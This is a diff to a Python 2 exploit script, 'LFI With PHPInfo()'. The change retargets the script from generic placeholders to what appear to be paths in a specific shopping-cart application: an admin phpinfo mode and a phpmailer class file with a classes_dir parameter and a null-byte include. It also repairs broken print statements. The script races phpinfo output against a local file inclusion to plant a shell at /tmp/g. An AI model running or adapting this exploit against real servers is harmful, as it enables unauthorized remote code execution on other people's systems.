@@ -14,8 +14,8 @@ Content-Type: text/plain\r
 %s
 ----------------------------7dbff1ded0714--\r""" % PAYLOAD
     padding = "A" * 5000
-    REQ1 = """POST /phpinfo.php?a=""" + padding + """ HTTP/1.1\r
-Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=""" + padding + """\r
+    REQ1 = """POST /admin.php?target=tools&mode=phpinfo&a=""" + padding + """ HTTP/1.1\r
+Cookie:  csid=a3cb7a1b53b1dd6b0a06a6dc70b5b933; cart_languageC=EN; secondary_currencyC=usd; acsid=2ec57fd7e3094e39349fc66eb9a27c96; cart_languageA=EN; secondary_currencyA=usd; othercookie=""" + padding + """\r
 HTTP_ACCEPT: """ + padding + """\r
 HTTP_USER_AGENT: """ + padding + """\r
 HTTP_ACCEPT_LANGUAGE: """ + padding + """\r
@@ -27,7 +27,7 @@ Host: %s\r
 %s""" % (len(REQ1_DATA), host, REQ1_DATA)
 
     # modify this to suit the LFI script
-    LFIREQ = """GET /lfi.php?load=%s%%00 HTTP/1.1\r
+    LFIREQ = """GET /classes/phpmailer/class.cs_phpmailer.php?classes_dir=%s%00 HTTP/1.1\r
 User-Agent: Mozilla/4.0\r
 Proxy-Connection: Keep-Alive\r
 Host: %s\r
@@ -86,8 +86,7 @@ class ThreadWorker(threading.Thread):
                 if self.event.is_set():
                     break
                 if x:
-                    print
-                    "\nGot it! Shell created in /tmp/g"
+                    print "\nGot it! Shell created in /tmp/g"
                     self.event.set()
 
             except socket.error:
@@ -114,27 +113,22 @@ def getOffset(host, port, phpinforeq):
     if i == -1:
         raise ValueError("No php tmp_name in phpinfo output")
 
-    print
-    "found %s at %i" % (d[i:i + 10], i)
+    print "found %s at %i" % (d[i:i + 10], i)
     # padded up a bit
     return i + 256
 
 
 def main():
-    print
-    "LFI With PHPInfo()"
-    print
-    "-=" * 30
+    print "LFI With PHPInfo()"
+    print "-=" * 30
 
     if len(sys.argv) < 2:
-        print
-        "Usage: %s host [port] [threads]" % sys.argv[0]
+        print "Usage: %s host [port] [threads]" % sys.argv[0]
         sys.exit(1)
     try:
         host = socket.gethostbyname(sys.argv[1])
     except socket.error, e:
-        print
-        "Error with hostname %s: %s" % (sys.argv[1], e)
+        print "Error with hostname %s: %s" % (sys.argv[1], e)
         sys.exit(1)
 
     port = 80
@@ -143,8 +137,7 @@ def main():
     except IndexError:
         pass
     except ValueError, e:
-        print
-        "Error with port %d: %s" % (sys.argv[2], e)
+        print "Error with port %d: %s" % (sys.argv[2], e)
         sys.exit(1)
 
     poolsz = 10
@@ -153,12 +146,10 @@ def main():
     except IndexError:
         pass
     except ValueError, e:
-        print
-        "Error with poolsz %d: %s" % (sys.argv[3], e)
+        print "Error with poolsz %d: %s" % (sys.argv[3], e)
         sys.exit(1)
 
-    print
-    "Getting initial offset...",
+    print "Getting initial offset...",
     reqphp, tag, reqlfi = setup(host, port)
     offset = getOffset(host, port, reqphp)
     sys.stdout.flush()
@@ -167,8 +158,7 @@ def main():
     e = threading.Event()
     l = threading.Lock()
 
-    print
-    "Spawning worker pool (%d)..." % poolsz
+    print "Spawning worker pool (%d)..." % poolsz
     sys.stdout.flush()
 
     tp = []
@@ -187,18 +177,14 @@ def main():
                     break
         print
         if e.is_set():
-            print
-            "Woot! \m/"
+            print "Woot! \m/"
         else:
-            print
-            ":("
+            print ":("
     except KeyboardInterrupt:
-        print
-        "\nTelling threads to shutdown..."
+        print "\nTelling threads to shutdown..."
         e.set()
 
-    print
-    "Shuttin' down..."
+    print "Shuttin' down..."
     for t in tp:
         t.join()
 
